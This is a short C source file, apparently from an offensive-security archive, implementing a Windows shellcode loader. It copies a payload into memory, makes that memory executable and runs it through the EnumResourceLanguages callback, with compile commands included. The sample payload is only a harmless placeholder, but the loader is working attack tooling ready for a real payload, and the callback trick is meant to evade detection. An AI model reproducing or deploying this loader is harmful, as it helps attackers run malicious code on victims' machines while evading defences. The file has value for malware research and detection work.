/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.
    Image should have string resource.

Compile:
    $ rc resources.rc
    $ cvtres /MACHINE:x64 resources.res
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /MACHINE:x64 /Tccode.cpp resources.obj

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  EnumResourceLanguages
*/

#include <windows.h>
#include <stdint.h>
#include "resources.h"


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HMODULE mod;
    LPCSTR  type;
    LPCSTR  name;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        mod = GetModuleHandle(NULL);
        type = RT_STRING;
        name = MAKEINTRESOURCE(REVID_STRING);

        // execute the payload by enumerating resources
        EnumResourceLanguages(mod, type, name, (ENUMRESLANGPROC)runtime, 0);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}